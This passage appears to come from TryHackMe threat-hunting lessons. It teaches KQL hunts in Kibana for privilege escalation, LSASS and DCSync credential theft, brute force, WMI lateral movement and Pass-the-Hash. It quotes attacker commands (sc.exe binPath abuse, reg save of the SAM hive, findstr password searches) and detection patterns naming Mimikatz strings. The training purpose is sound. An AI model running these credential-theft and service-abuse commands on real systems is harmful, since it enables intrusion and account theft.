 purpose of the spoofer process, let's use the binary's hash in 
VirusTotal and see if it is attributed to a known malicious binary.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/b8b4e357c738343cec6e59ff19709e6f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/b8b4e357c738343cec6e59ff19709e6f.png)

According to VirusTotal, the binary is attributed to **PrintSpoofer.** This confirms our suspicion that the binary we discovered is a known tool used for privilege escalation, abusing the **SeImpersonatePrivilege** to
 gain privileged access to a machine. Moreover, this explains why 
the DefaultAppPool account was able to spawn a child process owned by 
the SYSTEM account. This is because the DefaultAppPool account, by 
default, has SeImpersonatePrivilege, and the attacker exploited this to 
achieve a successful privilege escalation.

Following a 
threat hunter's mindset, the next step of this investigation is to 
identify the subsequent actions made by the attacker using the 
privileged SYSTEM account. Moreover, it is also good to trace the events
 generated on the compromised workstation before the successful 
privilege escalation attempt.

# Excessive Service Permission Abuse

For the last scenario, we will use the `winlogbeat-*` index to hunt for potential service permission abuse activity from all hosts on July 9, 2023. Ensure all queries to the Kibana console are set to look for the right index and timeframe.

Aside
 from abusing account privileges, threat actors also hunt for excessive 
permissions assigned to their current account access. One example is 
excessive service permissions allowing low-privileged users to modify 
and restart services running on a privileged account context. Given 
this, we will hunt for events abusing this behaviour using Sysmon Event ID: 13 (Registry Value Set) with the following KQL query:

`winlog.event_id: 13 AND registry.path: *HKLM\\System\\CurrentControlSet\\Services\\*\\ImagePath*`

The
 KQL query above is focused on hunting registry modifications on the 
services' ImagePath registry key, which is the field that handles what 
binary will be executed by the service.

In addition, ensure that the following fields are added as columns to aid us in our investigation:

- host.name
- process.name
- registry.path
- winlog.event_data.Details (This handles the data written in the registry.)

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/f4a0a40b6cde7d51d542e7689832ce33.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/f4a0a40b6cde7d51d542e7689832ce33.png)

Based on the results, two events are highly notable - modification of two services' ImagePath value with `C:\Users\bill.hawkins\Documents\update.exe`. They are notable after excluding all registry modifications with `svchost.exe` value since it is a typical value stored in an ImagePath key.

Let's
 dig deeper by viewing the surrounding documents on SNMPTRAP's 
modification log. This functionality provides the preceding and 
succeeding logs relative to the chosen log entry (e.g. +5/-5 log 
entries).

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/ac64aa6ee2cef2173d2845a786aa9d0d.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/ac64aa6ee2cef2173d2845a786aa9d0d.png)

Once the **View surrounding documents** page is open, filter all events with `winlog.event_id: 1` so we can focus on all process creation events around the SNMPTRAP modification event.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/2c3a26fc6cd4a3f99d2d72c238d44b6d.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/2c3a26fc6cd4a3f99d2d72c238d44b6d.png)

Now
 that the events around the log we are investigating are all process 
creation events, let's analyse the prior events generated before it.

Upon checking the `sc.exe` process before the modification of SNMPTRAP's registry, it can be seen that the service modification was done using the `sc.exe` binary with the arguments `config SNMPTRAP binPath= C:\Users\bill.hawkins\Documents\update.exe`. Moreover, it can be seen that the user who initiated the command is bill.hawkins, which is possibly not a privileged account.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5e33ae8d2caaed1db49ad6cc789af3cd.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5e33ae8d2caaed1db49ad6cc789af3cd.png)

Now that we have seen the cause of the modification, let's check the subsequent `cmd.exe` process after the registry was set.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/9da0e62226e576aec8a2f44625c41e1f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/9da0e62226e576aec8a2f44625c41e1f.png)

According
 to the records, it can be observed that the user then started the 
modified SNMPTRAP service. This may indicate that the service may have 
executed the binary `C:\Users\bill.hawkins\Documents\update.exe` in a privileged account context. Let's use the following KQL query to confirm the suspicion:

`winlog.event_id: 1 AND process.parent.name: services.exe AND process.name: update.exe`

In addition, ensure that the following fields are added as columns to aid us in our investigation:

- host.name
- process.parent.command_line
- user.name
- process.command_line

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5a424e07170082ee62e71e9e305e5e2e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5a424e07170082ee62e71e9e305e5e2e.png)

Based
 on the results, the SYSTEM account spawned the update.exe binary. This 
confirms the suspicion of SNMPTRAP's service permission abuse leading to
 a successful privilege escalation to SYSTEM.

Following a threat 
hunter's mindset, the next step of this investigation is to identify the
 subsequent actions made by the attacker using the privileged SYSTEM 
account. Moreover, it is also good to trace the events generated by the 
parent process of **sc.exe** to understand the events before the successful privilege escalation attempt.

**Credential Access**

**Tactic: Credential Access**

The [Credential Access Tactic (TA0006)](https://attack.mitre.org/tactics/TA0006/)
 involves attackers' methods to steal or discover valid account 
usernames and passwords (or hashes). This is a critical step for 
attackers, allowing them to escalate privileges or gain access to other 
systems or network resources. Example techniques used by adversaries are
 the following:

- Dumping credentials in memory or the disk.
- Enumerating files containing credentials (scripts or browser files).
- Dumping domain credentials.
- Credential spraying and brute-forcing.
- Reusing discovered passwords or hashes on other accounts.

Moreover,
 these examples are typically used to acquire necessary authentications 
and escalate access to the target system or network. With valid 
credentials, attackers can masquerade as authorised users, traverse the 
network undetected, and even gain administrative privileges, given the 
right conditions. The collected credentials also pave the way for other 
tactics, such as lateral movement and privilege escalation, further 
deepening the extent of the compromise.

To understand the tactic further, let's dive deep into more detailed scenarios and how it can be seen through event logs.

# Understanding the Tactic

The
 techniques adversaries use are not limited to the examples above, as 
there are different ways for an adversary to discover and leverage new 
credentials. However, we will use these examples to understand this 
tactic and grasp how to hunt it.

The common intersection of the 
examples above is harvesting and gathering credentials to obtain further
 access in the compromised host or to be able to jump and access another
 workstation or server.

| **Discovery Technique** | **Examples** |
| --- | --- |
| Credentials in disk or memory | Dumping LSASS via Mimikatz or creation of LSASS dump file, listing account information in Windows Registry (`reg.exe save hklm\sam`), or extracting DPAPI credentials with SharpDPAPI. |
| Credentials in files | Harvesting credentials in files using `findstr /s/n/m/i password`, finding credential manager files (Keepass or SSH keys, and dumping browser credentials via SharpChrome or Firefox Decrypt. |
| Domain credentials | Dumping domain credentials via DCSync or accessing Local Administrator credentials from LAPS. |
| Credential spraying | Multiple
 failed login attempts of various accounts on a single workstation or 
failed login attempts on multiple workstations using a single account. |

To summarise, the tactic focuses on obtaining new credentials in various ways to get further access to the network. An attacker will generally target any host or network asset containing credentials to proceed to the next attack step.

# Hunting Credential Access

Hunting
 Credential Access involves actively searching for indicators of 
adversaries attempting to acquire or misuse credentials within a system 
or network. Recognising red flags requires a deep understanding of 
typical credential usage, a vigilant approach to identifying anomalies, 
and a sense of different methods used by adversaries to access 
credential vaults or locations. In line with these, we will use the 
following scenarios to build our hunting methodology:

- Dumping host credentials from LSASS.
- Dumping domain credentials via DCSync.
- Obtaining valid accounts via brute-forcing.

# LSASS Credential Dumping

Starting with this scenario, we will use the `winlogbeat-*` index to hunt for potential LSASS credential dumping from all hosts on July 9, 2023. Ensure all queries to the Kibana console are set to look for the right index and timeframe.

After
 gaining privileged access to a compromised host, threat actors always 
tend to harvest more credentials and use them to move laterally. One of 
the most prominent examples is dumping LSASS credentials via Mimikatz. 
Another way is simply creating a dump file of the lsass.exe process, 
which contains in-memory credentials. We will hunt for known indicators 
of these activities.

# Hunting Mimikatz Execution

Using the **Discover** tab, we will hunt for potential usage of Mimikatz for credential dumping using the following KQL query:

`winlog.event_id: 1 AND process.command_line: (*mimikatz* OR *DumpCreds* OR *privilege\:\:debug* OR *sekurlsa\:\:*)`

**Note: The above are known strings used in the command_line query to dump credentials via Mimikatz.**

In addition, ensure that the following fields are added as columns to aid us in our investigation:

- host.name
- user.name
- process.parent.command_line
- process.name
- process.command_line

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/6f484107fad54d9b4db3c74afac52060.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/6f484107fad54d9b4db3c74afac52060.png)

Based on the results, it can be seen that there has been an attempt to dump LSASS credentials from `WKSTN-1`. Moreover, the attacker used the PowerShell version of Mimikatz (Invoke-Mimikatz.ps1), downloaded from GitHub.

# Hunting LSASS Process Dumping

As
 an alternative technique for Mimikatz, threat actors can use the Task 
Manager and create a process dump of lsass.exe. However, this technique 
also leaves traces, which security analysts can leverage to detect this 
technique. By default, dump files generated by the Task Manager are 
written to `C:\Users\*\AppData\Local\Temp\` directory and named using the format `processname.DMP`.

Given this, we will hunt for file creations of lsass.DMP and will use the following KQL query:

`winlog.event_id: 11 AND file.path: *lsass.DMP`

In addition, ensure that the following fields are added as columns to aid us in our investigation:

- host.name
- winlog.event_data.User
- process.name
- file.path

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/c8dc5a47e55ab490fa1fba2aed0ceffb.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/c8dc5a47e55ab490fa1fba2aed0ceffb.png)

Based on the results, the account `bill.hawkins` dumped the LSASS process and created a file in his `AppData\Local\Temp` directory. The attacker can use this dump file to retrieve stored credentials inside the LSASS process.

Following
 a threat hunter's mindset, the next step of this investigation is to 
hunt for potential usage of valid accounts harvested from the LSASS 
credential dump. Most likely, the authentication will come from the 
compromised workstation jumping to another workstation since it serves 
as the pivot machine to reach other internal hosts.

Moreover, it 
is good to trace back the events before the credential dumping activity 
since it can only be done using a privileged account. Given the context,
 the attacker was able to gain privileged access first before 
successfully executing this activity.

# Credential Harvesting via DCSync

In the following scenario, we will use the `winlogbeat-*` index to hunt for unusual processes spawned by the SYSTEM account from all hosts on July 9, 2023. Ensure all queries to the Kibana console are set to look for the right index and timeframe.

After
 understanding different ways to dump credentials from a compromised 
host, we will hunt for attempts to dump domain credentials directly from
 the domain controller via DCSync.

DCSync abuses how domain 
controllers in an Active Directory network communicate and replicate 
data. Normally, domain controllers synchronise directory information, 
including password hashes, via the Directory Replication Service Remote 
protocol (MS-DRSR). The replication request to a domain controller requires the following privileges:

- DS-Replication-Get-Changes (1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)
- DS-Replication-Get-Changes-All (1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)
- Replicating Directory Changes All (9923a32a-3607-11d2-b9be-0000f87a36b2)
- Replicating Directory Changes In Filtered Set (89e95b76-444d-4c62-991a-0facbeda640c)

**Note: Only Domain/Enterprise Admins and domain controller machine accounts have these privileges by default.**

Using the **Discover** tab, we will hunt for unusual replication attempts to the domain controller using the following KQL query:

`winlog.event_id:
 4662 AND winlog.event_data.AccessMask: 0x100 AND 
winlog.event_data.Properties: (*1131f6aa-9c07-11d1-f79f-00c04fc2dcd2* OR
 *1131f6ad-9c07-11d1-f79f-00c04fc2dcd2* OR 
*9923a32a-3607-11d2-b9be-0000f87a36b2* OR 
*89e95b76-444d-4c62-991a-0facbeda640c*)`

For this query, we will use the event ID 4662 to hunt for events related to **Directory Service object access** since we want to trace when a user attempts to access an Active Directory Domain Services (AD DS) object. Moreover, we have translated the privileges into their corresponding GUID value and used it on the `winlog.event_data.Properties`
 field. Lastly, we have also added the AccessMask value of 0x100 
(Control Access). This value signifies that the user has enough 
privileges to conduct the replication.

In addition, ensure that the following fields are added as columns to aid us in our investigation:

- host.name
- winlog.event_data.SubjectUserName
- winlog.event_data.AccessMask
- winlog.event_data.Properties

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/05a523a61bab8339069db3f082bf4124.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/05a523a61bab8339069db3f082bf4124.png)

Based on the results, it can be seen that the `backupadm`
 account has attempted to do a DCSync attack. This may indicate that the
 discovered account is either a Domain Admin or Enterprise Admin, since 
the account was able to dump domain credentials from DC01 successfully. 
Following the events generated, the only typical event was logged by the
 DC01 machine account.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/9ee8c278a34a9a1ac767a2c5228e61ba.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/9ee8c278a34a9a1ac767a2c5228e61ba.png)

To continue our investigation, we can investigate the suspicious `backupadm` account by checking all process creation events spawned by this account using the following KQL query:

`winlog.event_id: 1 AND user.name: backupadm`

In addition, ensure that the following fields are added as columns to aid us in our investigation:

- host.name
- process.parent.command_line
- process.command_line

Lastly, click the arrow beside the **Time** column to sort the process creation events in ascending order.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/91c1cb95ab5d0855de5dcfc5d727e7c0.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/91c1cb95ab5d0855de5dcfc5d727e7c0.png)

Based
 on the results, it can be seen that the account has executed unusual 
commands through cmd.exe. This proves our suspicion that this account 
might have been compromised and used maliciously to dump domain 
credentials via DCSync.

Following a threat hunter's mindset, the 
next step of this investigation is to hunt potential activities by 
threat actors to achieve this objective. Having access to a Domain 
Admin/Enterprise Admin account allows attackers to do anything inside 
the compromised domain. Moreover, it is also important to trace back how
 this account was compromised in the first place. One possibility is 
that the account credentials of `backupadm` were harvested 
through LSASS credential dumping, which relates to the credential 
dumping activity detected from the previous hunt.

# Brute-Forcing Accounts

For the last scenario, we will use the `winlogbeat-*` index to hunt for account brute-forcing activity from all hosts on July 9, 2023. Ensure all queries to the Kibana console are set to look for the right index and timeframe.

Brute-forcing
 attacks are focused on authentication events, which generate several 
failed attempts before successfully retrieving a valid credential. We 
will hunt for behaviours that satisfy this idea.

To start hunting,
 use the Visualize Library again and create a visualisation table using 
Lens. Ensure that the table is configured with the following:

- Set the Table Index (winlogbeat), Rows (host.name and user.name), and Metrics (count).
- Use the KQL query below to list all failed logon attempts (Event ID 4625) in a Windows machine:

`winlog.event_id: 4625`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/ca4d0a80314a6f6435495fd1da1f0dbb.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/ca4d0a80314a6f6435495fd1da1f0dbb.png)

Based on the results, it can be seen that the account of `jade.burke` has generated numerous failed login attempts to `WKSTN-1`.
 The number generated seems unusual and needs further investigation. 
Let's focus on this information and use the Discover tab to expand the 
details about this activity. We can use the following KQL query to list 
all failed login attempts of this account:

`winlog.event_id: 4625 AND user.name: jade.burke`

In addition, ensure that the following fields are added as columns to aid us in our investigation:

- host.name
- user.name
- source.ip
- winlog.event_data.LogonType

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/2f0bb37ab17d4a24a1d3e58f64717a9e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/2f0bb37ab17d4a24a1d3e58f64717a9e.png)

Based
 on the results, it can be seen that the failed authentication attempts 
are coming from 10.10.184.105, and the logon type is 3 (Network), which 
indicates that the account is authenticating to a service from a network
 (via SMB
 or WinRM for example). Sometimes, these failed login attempts over 
network authentication are due to possible misconfiguration that 
prevents users from legitimately accessing shared resources over the 
network.

To confirm if the user has successfully 
authenticated after a potential brute-forcing attempt, we can replace 
the KQL query with Event ID 4624 and focus on authentication attempts 
coming from **10.10.184.105**.

`winlog.event_id: 4624 AND user.name: jade.burke and source.ip: 10.10.184.105`

Note that Event ID 4624 is generated when a user has successfully authenticated in a workstation or a server.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/8c0d9f62c47d882c05c8c3cac7c19525.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/8c0d9f62c47d882c05c8c3cac7c19525.png)

Based on the results, we can see that the user has successfully accessed `WKSTN-1`.
 To expand our investigation, we can then check the processes spawned by
 this user inside the workstation. Let's use this KQL query to see the 
processes spawned by the user on WKSTN-1:

`host.name: WKSTN-1* AND winlog.event_id: 1 AND user.name: jade.burke`

Moreover, ensure that the following fields are added as columns to aid us in our investigation:

- process.parent.command_line
- process.command_line

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/13532d13028ddba06c5984121e9e077a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/13532d13028ddba06c5984121e9e077a.png)

Based
 on the results, it can be observed that the user has executed unusual 
commands inside WKSTN-1. This proves the suspicion that the account of `jade.burke` was brute-forced and was successfully used to authenticate and execute malicious commands on WKSTN-1.

Following a threat hunter's mindset, the next step of this investigation is to identify the impact of the commands executed by **jade.burke**
 on the newly-accessed machine. Moreover, it is also essential to 
determine how the source host of the brute-forcing activity was 
compromised.

**Lateral Movement**

# Tactic: Lateral Movement

The [Lateral Movement Tactic (TA0008)](https://attack.mitre.org/tactics/TA0008/)
 represents an attacker's techniques to navigate a network, leveraging 
the credentials and sessions harvested during previous attack phases. 
This could involve moving from one system to another using various 
methods:

- Exploiting internal remote services and applications.
- Using legitimate administrative tools to access remote hosts.
- Authenticating to other workstations or servers using valid credentials.
- Accessing sensitive information stored in file servers or database servers.

Moreover,
 these examples enable an attacker to explore a network, find valuable 
assets, and gain access to them. Exploiting remote services, for 
instance, involves exploiting vulnerabilities in these internal services
 to gain remote control over a system. At the same time, legitimate 
administrative tools can be used to move through a network undetected.

To understand the tactic further, let's dive deep into more detailed scenarios and how it can be seen through event logs.

# Understanding the Tactic

The
 techniques adversaries use are not limited to the examples above, as 
there are different ways for an adversary to access reachable internal 
hosts remotely. However, we will use these examples to understand this 
tactic and grasp how to hunt it.

The common intersection of the 
examples above is authenticating and exploiting internal services and 
applications to gain remote access.

| **Lateral Movement Technique** | **Examples** |
| --- | --- |
| Exploiting internal services | Attacking
 internal servers running vulnerable applications/services, such as web 
applications, printers, email services, and domain controllers. |
| Usage of legitimate admin tools | Using legitimate administration tools, such as PsExec, Windows Management Instrumentation, PowerShell remoting, and Remote Desktop Applications. |
| Authenticating with valid credentials | Using
 plaintext passwords from credentials discovered or using Pass-the-Hash 
or Pass-the-Ticket to authenticate using dumped hashes. |
| Accessing sensitive information | Authenticating to file, database, and cloud storage servers. |

The
 tactic focuses on pivoting from one host to another, leaving traces of 
internal network connections to available services and valid 
authentications. By accessing 
additional resources, the attacker can further their illicit activities -
 whether it be data exfiltration, system disruption, or setting up a 
deeper foothold for future operations.

# Hunting Lateral Movement

The
 hunt for Lateral Movement involves uncovering suspicious authentication
 events and remote machine access from a haystack of benign login 
attempts by regular users. On a typical working day in an internal 
network, events generating remote access to different hosts and services
 are expected. May it be access to a file share, remote access 
troubleshooting, or network-wide deployment of patches. In the following
 sections, we will delve deeper into strategies and techniques for 
hunting Lateral Movement activities, interpreting host authentication 
and network connection events, and recognising anomalies through the 
following scenarios:

- Lateral Movement via WMI.
- Authentication via Pass-the-Hash.

# Lateral Movement via

Starting with this scenario, we will use the `winlogbeat-*` index
 to hunt for potential lateral movement via Windows Management 
Instrumentation from all hosts on July 9, 2023. Ensure all queries to 
the Kibana console are set to look for the right index and timeframe.

Threat
 actors move laterally after gaining valid credentials from compromised 
hosts by utilising the credentials harvested from the initially 
compromised hosts. There are many ways to access hosts or services 
remotely, but we will focus on Windows Management Instrumentation (WMI) in this scenario.

WMI
 is widely used for system administration, monitoring, configuration 
management, and automation tasks in Windows environments. However, 
threat actors also use this functionality to execute commands remotely 
and establish access to remote targets. One standard indicator of WMI's 
usage is the execution of the WmiPrvSE.exe process. In addition, this 
process will spawn a child process if WMI is used to execute commands 
remotely.

Based on this information, we will use the following KQL query to hunt unusual behaviour related to WMI:

`winlog.event_id: 1 AND process.parent.name: WmiPrvSE.exe`

In addition, ensure that the following fields are added as columns to aid us in our investigation:

- host.name
- user.name
- process.parent.command_line
- process.command_line

Lastly,
 sort the timestamp in ascending order to view the sequence of attacks 
from the earliest execution timestamp (click the arrow beside the **Time** column).

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/e7944e3a8174bfce710982236779185a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/e7944e3a8174bfce710982236779185a.png)

Based on the results, it can be seen that `WmiPrvSE.exe` has spawned multiple instances of `cmd.exe` processes on WKSTN-1 using the account of `clifford.miller`.
 Moreover, the commands executed through cmd.exe has an unusual pattern,
 which seems that it is writing the executed commands' output on `ADMIN$` or `C:\Windows\` directory.

The pattern, `cmd.exe /Q /c * \ 1> \\127.0.0.1\ADMIN$\* 2>&1`,
 is attributed to Impacket's wmiexec.py, a known tool for lateral 
movement. Given this, it confirms our suspicion of the events generated 
by WmiPrvSE.exe.

To continue our investigation, let's analyse the closest authentication event of clifford.miller to WKSTN-1. We can use **View surrounding documents** to hunt for login events close to the first WMIExec execution.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/bac19fcdd1a837be3b129f9847b9fd56.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/bac19fcdd1a837be3b129f9847b9fd56.png)

Once
 the surrounding documents page is open, apply the following filters to 
find successful authentication events of clifford.miller.

- host.name: WKSTN-1.threathunting.thm (Click the plus button beside the host.name value)
- user.name: clifford.miller (Click the plus button beside the user.name value)
- winlog.event_id: 4624 (Add a new filter)

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/31b67c8bf5f88cf2884bd045740ddd92.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/31b67c8bf5f88cf2884bd045740ddd92.png)

Using
 the view, we can inspect the event log before the execution of 
WmiPrvSE.exe, which is the log below on our current view. We can click 
the drop-down button to view the contents of the log.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/3cd6a4a23910a6ccc4d4eb8bcda60bce.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/3cd6a4a23910a6ccc4d4eb8bcda60bce.png)

Based on the message field, it can be seen that the authentication of `clifford.miller` is a **Network Logon** (Logon Type 3) and came from `10.10.184.105`.
 Given this, we have identified the potential source of the attack, 
which might also be compromised since the attacker executes the remote 
commands from the specified source IP.

Following a threat hunter's
 mindset, the next step of this investigation is to identify the extent 
of the attack by checking the child processes spawned by the 
WmiPrvSE.exe process. Moreover, it is also essential to understand how `10.10.184.105` was compromised in the first place, which allowed the attacker to pivot to `WKSTN-1`.

# Authentication via Pass-the-Hash

For the last scenario, we will use the `winlogbeat-*` index to hunt for indicators of Pass-the-Hash events from all hosts on July 9, 2023. Ensure all queries to the Kibana console are set to look for the right index and timeframe.

Threat
 actors also utilise account hashes if the plaintext password does not 
exist from the dumped credentials as an alternative way of 
authentication, and this technique is
 called Pass-the-Hash (PtH). PtH is a technique threat actors use to 
authenticate and gain unauthorised access to systems without knowing the
 user password. It exploits how authentication protocols, such as NTLM, store and use password hashes instead of plaintext passwords.

This
 technique might be challenging, but there are ways to detect the usage 
of PtH while authenticating remotely. The list below details the 
indicators of PtH on network authentication:

- Event ID: 4624
- Logon Type: 3 (Network)
- LogonProcessName: NtLmSsp
- KeyLength: 0

Using the **Discover** tab, we will hunt for potential usage of Pass-the-Hash by translating the information above into a KQL query:

`winlog.event_id:
 4624 AND winlog.event_data.LogonType: 3 AND 
winlog.event_data.LogonProcessName: *NtLmSsp* AND 
winlog.event_data.KeyLength: 0`

In addition, ensure that the following fields are added as columns to aid us in our investigation:

- host.name
- user.name

Lastly,
 sort the timestamp in ascending order to view the sequence of attacks 
from the earliest execution timestamp (click the arrow beside the **Time** column).

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/423386aa86588837c18f62a2e6d86601.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/423386aa86588837c18f62a2e6d86601.png)

Based
 on the results, it can be observed that two users (excluding ANONYMOUS 
LOGON, since it is a known false positive value) have potentially 
authenticated to WKSTN-1 via Pass-the-Hash. Moreover, it can be seen 
that the authentication of clifford.miller came again from the presumed 
compromised workstation `10.10.184.105`.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/e9f379e927bec5c26779687e7cc5764b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/e9f379e927bec5c26779687e7cc5764b.png)

To
 continue with the investigation, let's focus on clifford.miller's first
 log entry using the view surrounding documents feature.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/3528dcea544a58043ecc61ace70f0554.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/3528dcea544a58043ecc61ace70f0554.png)

Once
 the surrounding documents page is open, apply the following filters to 
find all subsequent process creation events made by clifford.miller.

- host.name: WKSTN-1.threathunting.thm (Click the plus button beside the host.name value)
- user.name: clifford.miller (Click the plus button beside the user.name value)
- winlog.event_id: 1 (Add a new filter)

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/57ec0bbe109db550ba6230a84dfa6b27.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/57ec0bbe109db550ba6230a84dfa6b27.png)

Based on the results, it can be seen that multiple `cmd.exe` executions were made. We can expand the subsequent log to investigate further.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/642e82d9bcc09a3584fae1684cf7565d.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/642e82d9bcc09a3584fae1684cf7565d.png)

Upon
 inspecting the next cmd.exe execution log, it seems that the event is 
related to the WMIExec execution from the previous investigation. This 
confirms the suspicion of Pass-the-Hash activity by clifford.miller 
since wmiexec.py can use hashes to authenticate and execute commands 
remotely to the target host successfully. Moreover, combining two 
unusual subsequent events increased the likelihood of suspicious 
activity.

Following a threat hunter's mindset, the next step of 
this investigation is to identify the extent of the attack by checking 
the subsequent process creation events after detecting Pass-the-Hash 
activity. Moreover, it is also essential to understand how `10.10.184.105` was compromised in the first place, which allowed the attacker to pivot to `WKSTN-1`.

**Conclusion**

Congratulations!
 You have completed hunting different indicators of compromise and 
suspicious host and network activities in this room.

To conclude the room, let's summarise the different hunting methodologies that we discussed throughout the room:

| **Tactic** | **Hunting Methodology** |
| --- | --- |
| Discovery | • Look for executions of built-in tools used for enumerating user and host information.
• Spot unusual internal network scanning activities.
• Hunt for unusual processes initiating LDAP queries.
• Utilise the parent-child relationships of processes to connect associated events. |
| Privilege Escalation | • Look for unusual SYSTEM account processes spawned by a low-privileged user.
• Hunt for potential service permission abuses via service binary modification.
• Utilise the parent-child relationship of processes, including the context of the user who spawned it. |
| Credential Access | • Hunt for known indicators that are associated with LSASS credential dumping.
• Monitor events related to domain controller data replication.
• Seek patterns of numerous failed login attempts to Windows hosts, followed by successful authentication.
• Observe unusual process creation activities of potentially compromised accounts. |
| Lateral Movement | • Hunt for unusual process creations made by WmiPrvSE.exe.
• Look for suspicious successful authentication patterns that may indicate a potential Pass-the-Hash activity.
• Observe unusual process creation activities after detecting a successful lateral movement attempt.
• Correlate the source of the lateral movement attempt and investigate how the source was compromised. |

In
 essence, the list below generalises the usual progression of an 
attacker's thought process to pivot within an internal network:

1. Understand the environment of the current compromised machine and escalate privileges if possible.
2. Harvest credentials from different credential storages.
3. Move laterally by leveraging the valid credentials and blending in the internal traffic.

Moreover,
 attackers return to obtaining a foothold once a new machine is 
accessed, establishing more continued access in the compromised network.

This
 room covered ways to hunt suspicious activities related to pivoting 
within a compromised internal network. Once threat actors successfully 
move laterally, they may accomplish their objectives after gaining 
enough data from the compromised assets. If you found this room 
valuable, continue enhancing your threat-hunting knowledge by proceeding
 to [Threat Hunting: Endgame](https://tryhackme.com/room/threathuntingendgame).

## **THREAT HUNTING:ENDGAME**

**Getting Started in Threat Hunting for "Actions on Objectives"**

# Threat Hunting and ATT&CK

Threat
 hunting is a proactive and systematically iterative approach to the 
active security investigation process/practice that focuses on 
detecting/finding malicious or suspicious activities. MITRE
 ATT&CK framework is a joint knowledge base that explains, maps and 
binds the tactics and techniques used by adversaries. The hunting 
process leverages the framework as a guide by using known and emerging 
threats as a reference to develop a hypothesis, conduct an 
investigation, and categorise and stage activities.

# Unified Kill Chain and The "Actions on Objectives" Phase

The
 "Actions on Objectives" phase is the seventh and final phase of "The 
Cyber Kill Chain". The objective of this phase is to accomplish the goal
 of the adversary activity. Typical objectives include data 
exfiltration, data destruction/disruption, encryption for ransom, and 
credential theft. Understanding the adversary's purpose/objective is 
vital for successful and effective threat hunting practices.

Again, in the threat hunting process, being familiar with the Unified Kill Chain and MITRE ATT&CK
